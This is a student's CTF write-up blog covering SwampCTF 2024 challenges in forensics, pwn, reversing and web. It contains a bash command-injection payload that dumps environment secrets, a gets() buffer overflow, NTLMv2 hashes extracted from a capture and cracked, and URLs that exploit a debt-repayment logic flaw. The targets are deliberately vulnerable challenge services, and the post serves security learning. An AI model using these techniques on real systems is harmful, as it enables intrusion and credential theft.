---
title: "SwampCTF 2024"
date: 2024-04-07
tags: ["CTF", "Writeup", "Competitions"]
---

I recently participated in [SwampCTF](https://swampctf.com/), a 2-day student-run CTF put on by the University of Florida's [Student Information Security Team](https://ufsit.club/). Our team was madeup of a handful of students from [CCSO](https://psuccso.org), and we were able to place 34th out of 362 participating teams. This CTF was really well run, and the challenges were fun and pretty unique.

## Ping Pong - Forensics

Prompt: `What happened to my traffic??? The pings?!?? They're taking over!!!! They're... ping... pong pingpong ping find my pong flag.`

We're provided with a pcap with almost exclusively ICMP traffic. After examining a couple, it looked like they contained a base64 payload broken up across the packets. The last one in particular gave it away wiith the charictaristic `==`.

![Base64 Payload](security/swampctf-24/ping-payload.png)

I cooked up a little python script to fetch the data field from each ICMP packet and output them to a file.

```python
from scapy.all import *  
  
def extract_icmp_data(pcap_file, output_file):  
   # Open the pcap file  
   packets = rdpcap(pcap_file)  
      
   # Open the output file in write mode  
   with open(output_file, "w") as f:  
       # Iterate through each packet in the pcap file  
       for packet in packets:  
           # Check if the packet is an ICMP packet  
           if ICMP in packet:  
               # Extract the data field from the ICMP packet  
               data_field = packet[Raw].load  
               # Convert bytes to string and write to the output file  
               f.write(data_field.decode("utf-8") + "\n")  
  
def main():  
   # Specify the path to the pcap file  
   pcap_file = "./traffic.pcap"  
   # Specify the path to the output text file  
   output_file = "output.txt"  
      
   # Extract data from ICMP packets and write to text file  
   extract_icmp_data(pcap_file, output_file)  
   print("Data extracted from ICMP packets and written to", output_file)  
  
if __name__ == "__main__":  
   main()
```

I tossed the payload into CyberChef, decoded the base64, and downloaded the resulting image which contained the flag, yippee!

![Flag Image](security/swampctf-24/ping-flag.png)

## Easy Pwn - Pwn

Prompt: `Pwn can be a pretty intimidating catagory to get started in. So we made a few chals to help new comers get their feet wet!`

This was a pretty easy buffer overflow attack, we're provided with a host to netcat to and a source c file.

```c
int user_option;
int is_admin = 0;
char username[15];
    
setbuf(stdin, NULL);
setbuf(stdout, NULL);
    
printf("Please enter your username to login.\n"
    "Username:");

// I saw something online about this being vulnerable???
// The blog I read said something about how a buffer overflow could corrupt other variables?!?
// Eh whatever, It's probably safe to use here.
gets(username);

printf("Welcome %s!\n\n", username);

if(is_admin == 0){
    printf("User %s is not a system admin!\n\n", username);
} else {
    printf("User %s is a system admin!\n\n", username);
}
```

The code used for the server looks to be vulnerable to a buffer overflow (clearly), due to the use of gets to fill the username buffer. If we provide more input than expected, it'll write a nonzero value to isAdmin and print the flag.

![Super Hard Buffer Overflow](security/swampctf-24/easy-pwn.png)

## Employee Evaluation - Pwn

Prompt:

```text
This company sucks. They're ranking all the employees against one another, and they keep putting security to the sideline. The CISO told me that they don't care about actual code quality, just fancy buzzwords and looking nice. I want to get out of here, but I can't without this dang secret code. It's for, uh, good things, and not sharing secrets. This exposed evaluation script seems like a good start. Can you help me out?
```

Connecting to the provided host gives us the following output:

```text
❯ nc chals.swampctf.com 60010  
/-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-\  
|                                       |  
|  SwampCo Employee Evaluation Script™  |  
|                                       |  
|  Using a new, robust, and blazingly   |  
|  fast BASH workflow, lookup of your   |  
|  best employee score is easier than   |  
|  ever--all from the safe comfort of   |  
|     a familiar shell environment      |  
|                                       |  
\-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-/  
  
To start, enter the employee's name...  
```

From the prompt we can assume it's running in a bash environment, I provided `| whoami` as initial output to see what it would spit out.

```text
| whoami  
/app/run: line 44: ${employee_| whoami_score}: bad substitution
```

It looks like our output is getting substituted inside of a variable using the syntax `${employee_[input]_score}`, we need to find a way to break out of that and get the flag output.

I went with the payload `adam_score}$(sh -c env)#`. `adam_score}` finished the line with a legit employee value, and `$(sh -c env)` should output the environment variables. The trailing `#` will comment out the rest of the line and ensure our command is run.

```text
❯ nc chals.swampctf.com 60010  
/-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-\  
|                                       |  
|  SwampCo Employee Evaluation Script™  |  
|                                       |  
|  Using a new, robust, and blazingly   |  
|  fast BASH workflow, lookup of your   |  
|  best employee score is easier than   |  
|  ever--all from the safe comfort of   |  
|     a familiar shell environment      |  
|                                       |  
\-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-/  
  
To start, enter the employee's name...  
adam_score}$(sh -c env)#  
Employee adam_score}$(sh -c env)# score: 84}employee_cole_score=57  
SHLVL=0  
employee_alex_score=00  
employee_daniel_score=48  
employee_ben_score=47  
employee_omar_score=74  
employee_john_score=19  
_=/usr/bin/sh  
employee_wilson_score=61  
____secret_never_reveal_pls_thx__=swampCTF{flag_redacted}  
employee_vic_score=81  
employee_scott_score=94  
employee_adam_score=84  
employee_jon_score=41  
employee_jack_score=80  
employee_james_score=16  
employee_ethan_score=56  
PWD=/app  
employee_phoenix_score=89#_score
```

## New C2 Channel? - Forensics

Prompt: `Sometimes you can exfiltrate data with more than just plain text. Can you figure out how the attacker smuggled out the flag on our network?`

The provided pcap only contained some HTTP traffic, and following the stream to look at the contents didn't yield anything interesting:

```text
GET /index.php?username=&page=.d8888.........88P.888..........P..888..88888b.....888..888."88b8888888.888..888...888..888.d88P...888..88888P".........888....8........888.............888..... HTTP/1.1

Accept-Encoding: identity

Host: 127.0.0.1:8080

User-Agent: Python-urllib/3.11

Connection: close

  

HTTP/1.0 200 OK

Server: SimpleHTTP/0.6 Python/3.11.7

Date: Thu, 29 Feb 2024 06:07:47 GMT

Content-type: application/octet-stream

Content-Length: 40

Last-Modified: Thu, 29 Feb 2024 05:49:35 GMT

  

<?php

  

echo "The flag is not here";

  

?>
```

The URI for the get request looked really funky, so i used Wireshark to filter to only get requests with `http.request.method == "GET"`. I went down a whole rabbit hole trying to script out the process of examining the URIs which wasn't really needed.

### Script Solution (Scrapped)

My initial thought was to script out the process of getting the requested URI's, so I could look at the output. This ended up being way overkill and not helpful, but here's the script I used:

```python
from scapy.all import *  
  
def extract_http_get_uris(pcap_file, output_file):  
   # Open the pcap file  
   packets = rdpcap(pcap_file)  
      
   # Initialize an empty set to store unique HTTP GET URIs  
   http_get_uris = set()  
      
   # Iterate through each packet in the pcap file  
   for packet in packets:  
       # Check if the packet is an HTTP request (TCP and starts with "GET")  
       if packet.haslayer(TCP) and packet.haslayer(Raw) and "GET" in str(packet[Raw].load):  
           # Extract the HTTP GET URI  
           uri_start_index = str(packet[Raw].load).find("GET ") + len("GET ")  
           uri_end_index = str(packet[Raw].load).find("HTTP/1.")  
           if uri_start_index != -1 and uri_end_index != -1:  
               http_get_uri = str(packet[Raw].load)[uri_start_index:uri_end_index]  
               http_get_uris.add(http_get_uri)  
  
   # Write the extracted HTTP GET URIs to the output file  
   with open(output_file, "w") as f:  
       for uri in http_get_uris:  
           f.write(uri + "\n")  
  
def main():  
   # Specify the path to the pcap file  
   pcap_file = "./playback.pcap"  
   # Specify the path to the output text file  
   output_file = "http_get_uris.txt"  
      
   # Extract HTTP GET URIs from the pcap file and write to text file  
   extract_http_get_uris(pcap_file, output_file)  
   print("HTTP GET URIs extracted from packet capture and written to", output_file)  
  
if __name__ == "__main__":  
   main()
```

Then I used awk to cleanup the output `awk -F 'page=' '{print $2}' ./http_get_uris.txt > awked_http_get.txt`, so I had all the cleaned up URIs in a file. It didn't display correctly and was a PITA to format.

### Simple Solution

When the script output wasn't easily read I went back to Wireshark... I realized that you can literally hold the right arrow button and see the flag in ASCII art in Wireshark's data section.

![ASCII Art Flag](security/swampctf-24/c2-ascii.png)

![ASCII Art Flag](security/swampctf-24/c2-ascii-2.png)

I manually transcribed it and called it a day.

## Notoriously Tricky Login Mess - Forensics

### Part 1 - Username

Prompt:

```text
We found out a user account has been compromised on our network. We took a packet capture of the time that we believe the remote login happened. Can you find out what the username of the compromised account is?
```

The provided packet capture had a bunch of HTTP traffic which was using NTLM for authentication.

![User NTLM Auth](security/swampctf-24/logon-ntlm-auth.png)

I only saw 2 users, Administrator, and adamkadaban. Adamkadaban was the popped user.

### Part 2 - Password

Prompt: `Great job finding the username! We want to find out the password of the account now to see how it was so easily breached. Can you help?`

From the NTLM challenge response authentication seen in the packet capture, we can extract the needed info to get a hash to crack and find the user's password. I was initially looking for the format `[Username]::[Domain Name]:[NTLM Server Challenge]:[NTProofSTR]:[NTLMv2 Response]`.

![Username](security/swampctf-24/logon-user.png)

![Domain Name, Response, NTProofSTR](security/swampctf-24/logon-ntlm-info.png)

![Challenge](security/swampctf-24/logon-ntlm-chall.png)

I got the resulting hash:

```text
adamkadaban::EC2AMAZ-E33SGL8::9860ff77ebae7c49::427e62eb532e7cf982af3a23fb5aa4b2::427e62eb532e7cf982af3a23fb5aa4b2010100000000000000a205e9c266da01e7973bcb0507f9230000000002001e0045004300320041004d0041005a002d00450033003300530047004c00380001001e0045004300320041004d0041005a002d00450033003300530047004c00380004001e0045004300320041004d0041005a002d00450033003300530047004c00380003001e0045004300320041004d0041005a002d00450033003300530047004c003800070008001998a3e4c266da010000000000000000
```

We threw a ton at this and it didn't crack. The formatting was in fact wrong. What Wireshark was tagging as the domain name was in fact the host name. Switching to the following hash cracked it with rockyou:

```text
adamkadaban:::1fed9e8e0ca470a3:98ebffae0b77865893846dfadb757cfb:0101000000000000801c50dbc266da0188d48d08eff230a80000000002001e0045004300320041004d0041005a002d00450033003300530047004c00380001001e0045004300320041004d0041005a002d00450033003300530047004c00380004001e0045004300320041004d0041005a002d00450033003300530047004c00380003001e0045004300320041004d0041005a002d00450033003300530047004c003800070008005783ebd6c266da010000000000000000
```

![Cracked Hash](security/swampctf-24/logon-crack.png)

## Off The Hook - Rev

Prompt: `We did some dabbling with apk's, have fun!`

I opened the provided `swamp.apk` with VSCode using the APKTool extension. `CTRL + Shift + P > Open an APK`, will allow you to decompile an APK to java source, edit the app, etc.

![Hook](security/swampctf-24/hook-decompile.png)

There was an overwhelming amount of source files, and frankly I had no clue what I was looking for. I searched through all the files `swamp` and found `MainActivity.java`.

This file notably contained the getFlag function:

```java
public String getFlag() {

byte[] bytes = String.format("%1$-32s", "MUFFIN_MAN").getBytes(StandardCharsets.UTF_8);

GingerBread.f173S = GingerBread.generateSubkeys(bytes);

verify("Onions");

return "swampCTF{" + new String(GingerBread.gumdrop(Base64.decode("otP+wTo2MYdv8+Uv5Gyoqg==", 0), bytes), StandardCharsets.UTF_8) + "}";

}
```

I created a new file in the project, `Solve.java`, to output the flag and skip all the checks:

```java
package com.rumpelstiltskin;

  

import java.nio.charset.StandardCharsets;

import java.util.Base64;

  

import com.rumpelstiltskin.anative.GingerBread;

  

public class Solve {

public static void main(String[] args) {

byte[] bytes = String.format("%1$-32s", "MUFFIN_MAN").getBytes(StandardCharsets.UTF_8);

GingerBread.f173S = GingerBread.generateSubkeys(bytes);

System.out.println("swampCTF{" + new String(GingerBread.gumdrop(Base64.getDecoder().decode("otP+wTo2MYdv8+Uv5Gyoqg=="), bytes), StandardCharsets.UTF_8) + "}");

}

}
```

Running this allowed me to get the flag without having to run/compile/deal with the app itself:

![Flag](security/swampctf-24/hook-flag.png)

## Potion Seller - Web

Prompt: `My potions would kill you, traveler. You cannot handle my potions.`

Browsing to the provided site, we're greeted with a simple JSON output:

![Welcome](security/swampctf-24/potion-homepage.png)

We're provided with the source for the server which has a couple notable endpoints.

### Endpoints

Checkout:

```js
app.get('/checkout', (req, res) => {
    // Check if user has a pending loan
    if (req.session.user.loanPending) {
        return res.json({ message: "Ermm you still have a debt 🤓" });
    }

    // Set the loan to pending
    if (req.session.user.swampShade) {
        return res.json({ message: "You are worthy: " + FLAG });
    }
    else {
        return res.json({ message: "You don't possess the SwampShade potion!" });
    }
});
```

In order to get the flag, it looks like we need to checkout while possessing the SwampShade potion, and not having any debt.

Buy:

```js
const potions = [
    { name: "Essence of the Abyss ⚗️", price: 10 },
    { name: "Potion of Astral Alignment ⚗️", price: 2 },
    { name: "Elixir of the Enigma ⚗️", price: 34 },
    { name: "Stardust Elixir 🧪", price: 11 },
    { name: "Swampshade Serum ⚗️", price: 100 },
    { name: "Phoenix Tears Potion ⚗️", price: 65 },
];

app.get('/buy', (req, res) => {
    potionID = req.query.id;
    // Check if potion ID is valid
    if (!potionID || !potions[potionID]) {
        return res.json({ message: "Invalid potion ID" });
    }

    // Buy the potion
    if (req.session.user.gold < potions[potionID].price) {
        return res.json({ message: "Not enough gold" });
    }

    // Update user's stats
    req.session.user.gold -= potions[potionID].price;
    // SwampShade Serum
    if (potionID == 4) {
        req.session.user.swampShade = true;
    }
    return res.json({ message: "Potion acquired" });
});
```

The SwampShade potion costs 100 gold, but we have none...

Borrow:

```js
app.get('/borrow', (req, res) => {
    let amount = req.query.amount;
    // Check if request is a number
    if (!verifyAmount(amount)) {
        return res.json({ message: "Invalid amount" });
    }

    if (req.session.user.loanPending) {
        return res.json({ message: "Repay your loan first!" });
    } else {
        // Set the loan to pending
        req.session.user.loanPending = true;
        req.session.user.debtAmount = Number(amount);
        req.session.user.gold = Number(amount);
        return res.json({ message: "You have successfully borrowed gold 🪙" });
    }

});
```

Repay:

```js
app.get('/repay', checkUserSession, (req, res) => {

    // Get the amount to be repayed
    let amount = req.query.amount;

    // Check if user has a pending loan
    if (!req.session.user.loanPending) {
        return res.json({ message: "You do not have any debts" });
    }

    // Check if request is a number
    if (!verifyAmount(amount)) {
        return res.json({ message: "Invalid amount" });
    }

    // If the amount is a number, check if it's enough to repay the loan
    if (req.session.user.gold < Number(amount)) {
        return res.json({ message: "You don't have that much money" });
    }

    // Check if the amount is enough to repay the loan
    if (req.session.user.debtAmount <= Number(amount)) {
        return res.json({ message: "This is not enough to repay the debt" });
    }

    // Repay the loan
    req.session.user.gold = 0;
    req.session.user.debtAmount = 0;
    req.session.user.loanPending = false;

    return res.json({ message: "✨ Debt Repaid ✨" });
});
```

The meat of the issue here is with the repay endpoint. The program checks to see if the user has enough gold to pay back the amount requested, and then sets the full amount of the debt to 0. So if a user has a debt of 50, and pays pack 5, it will wipe all the debt.

### Solution

To get the flag we need to:

* Take out a loan
* Buy the SwampShade potion
* Repay the loan (exploiting the bad logic)
* Checkout

First I took out a loan for 101 gold with `http://chals.swampctf.com:64845/borrow?amount=101`.

![Loan](security/swampctf-24/potion-borrow.png)

Next, I bought the SwampShade potion with `http://chals.swampctf.com:64845/buy?id=4`.

![Buy](security/swampctf-24/potion-buy.png)

Then, I repaid 1 gold, which zeroed out the remaining debt with `http://chals.swampctf.com:64845/repay?amount=1`.

![Repay](security/swampctf-24/potion-repay.png)

Finally, we're able to checkout and get the flag, yippee!

![Checkout](security/swampctf-24/potion-checkout.png)
